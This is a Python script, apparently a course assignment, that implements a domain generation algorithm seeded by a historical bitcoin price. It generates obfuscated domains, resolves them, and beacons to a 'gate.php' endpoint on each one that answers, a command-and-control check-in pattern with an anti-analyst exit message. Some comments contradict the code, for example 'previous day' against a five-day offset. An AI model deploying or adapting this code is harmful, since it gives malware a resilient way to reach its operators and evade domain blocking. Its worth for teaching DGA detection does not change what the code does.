import datetime as dt
from datetime import timedelta as td
import requests
import sys
import socket
'''
TNEL DGA
This script is a non-deterministic DGA implementation for csc840
The following requirements were met:
- Accepted TLDs: .csc840.lan, .com, .press, .me, .cc
- Length: 9-15
- Alphabet: No vowels, numbers ok
- Non-deterministic
- Very well documented with comments throughout

DGA Logic:
This DGA is time dependent, non-deterministic due to bitcoin price of the day before which cannot be determined
in advance. I take this value and a few constants (1337, 42, 23, 8675309, 60652) and enter them into the
Linear Congruential Generator algorithm for creating pseudo random numbers. In my DGA I create 2 numbers one determines
if a number for character will be added based on even/odd of the LCG output the other determines the value of the unit
added to the domain.

The TLD is determined by taking the 3rd element in the domain and calculating remainder of the ordinal value division as
an offset

'''



def main():
    '''
    This is the main functionality of the tnel_dga
    :return: void
    '''
    # Variables
    # list of possible tlds
    tlds = ['.csc840.lan', '.com', '.press', '.me', '.cc']
    # list of alphabet chars without vowels
    alpha_novowels = ['b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x',
                      'z']
    # how many days to generate domains for
    day_count = 1
    # how many domains to generate
    domain_count = 10
    domain_length = 11
    # Initial Seed Value
    init_seed = 0xDEADBEEF
    #Grabs the bitcoin price of the previous day into an int
    try:
        bt_price = get_bitcoin_price((dt.datetime.now()-td(days=5)).strftime('%Y-%m-%d'))
    except:
        print("An Analyst must be watching...")
        sys.exit()


    # Loop for number of domains to create
    for n in range(domain_count):
        # clears domain variable for next DGA
        domain = ""
        dga_ip = ""
        init_seed ^= n + init_seed
        # DGA inner loop
        for y in range(domain_length):
            '''
            This code calculates flip seed to determine if it is chr or int using LCG
            In order to do this we take the previous day bitcoin price and the initial seed
            a = bitcoin_price divided by 42 (hitchhikers guide to the galaxy)
            x = init_seed (modified value of init_seed ^= n + init_seed)
            n = domain chr position
            mod = 1337 (l337 speak)
            c  = 8675309 (tommy tutone, jenny song #)
            '''
            flip_seed = int(lcg_random(bt_price/42, init_seed, y, 8675309, 1337))

            '''
            This code seeds the value that gets converted to a chr or digit in the domain using LCG
            In order to do this we take the previous day bitcoin price and the initial seed
            a = bitcoin_price divided by domain length
            x = init_seed (modified value of init_seed ^= n + init_seed)
            n = domain chr position
            mod = 23 (micheal jordan's jersey #)
            c = 60652 (scruff mcgruff zip code)
            '''
            dga_unit = int(lcg_random(bt_price/domain_length, init_seed, y, 60652, 23))
            # This part of the DGA determines weather to print a chr or number based on the even or odd value
            if flip_seed & 1:
                '''
                if odd then a chr is added to the domain, this prull the value from the no vowels alphabet
                '''
                domain += alpha_novowels[(dga_unit % 20)]
            else:
                '''
                if even a 1 digit number is added
                that 1 digit is the last digit of the dga_unit value
                '''
                domain += str(dga_unit % 10)

        #This will take the first letter of the domain and use this to determine tld by the index that the remainder value
        domain += tlds[ord(str(domain[2])) % 5]
        # prints the AGDs to stdout
        print("DGA for {} iteration num: {} is: {}".format(dt.datetime.now().strftime('%m/%d/%y'),n+1,domain))
        try:
            dga_ip = socket.gethostbyname(domain)
        except:
            print("An Analyst must be watching...")
            #sys.exit()
        print("seed:{}, domain:{}, DNS lookup:{}".format(bt_price, domain, dga_ip))
        if dga_ip:
            url="https://{}/gate.php".format(domain)
            r = requests.get(url)
            print(r.text)


def lcg_random(a, x, n, c,  m):
    '''
    This function uses the Linear Congruential Generator to create a psuedo-random value
    :param price:
    :param a:
    :param m:
    :return: flip_seed
    '''
    #The LCG formula
    flip_seed = (a * (x^n) + c) % m
    return flip_seed

def get_bitcoin_price(bitcoin_date):
    '''
    This function will take in a date (curr_date - 1) and return the bitcoin price from that day
    :param bitcoin_date:
    :return: price
    '''
    # grabs bitcoin price via json
    r = requests.get(
        url='https://api.coindesk.com/v1/bpi/historical/close.json?start={}&end={}'.format(bitcoin_date, bitcoin_date))
    bt_price = int(list(r.json()['bpi'].values())[0])
    return bt_price

if __name__ == '__main__':
    main()